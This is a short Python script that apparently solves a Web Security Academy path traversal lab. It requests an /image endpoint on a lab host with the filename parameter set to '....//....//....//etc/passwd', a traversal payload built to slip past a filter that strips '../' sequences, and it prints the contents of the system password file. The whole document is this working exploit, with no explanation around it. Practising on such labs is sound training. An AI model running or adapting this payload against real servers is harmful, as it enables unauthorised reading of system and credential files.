import requests

s = requests.Session()

if __name__ == "__main__":
    site = 'ac3f1fe31f3477eec0d30dc5009200ef.web-security-academy.net'
    path = '....//....//....//etc/passwd'
    url = f'''https://{site}/image?filename={path}'''
    resp = s.get(url)
    print(resp.text)
